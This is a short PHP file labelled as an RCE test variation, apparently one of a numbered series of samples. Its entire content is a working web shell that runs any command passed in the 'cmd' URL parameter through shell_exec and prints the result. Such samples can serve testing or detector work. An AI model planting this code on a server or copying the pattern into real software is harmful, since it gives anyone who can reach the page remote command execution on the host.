<?php
// RCE test variation #318
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>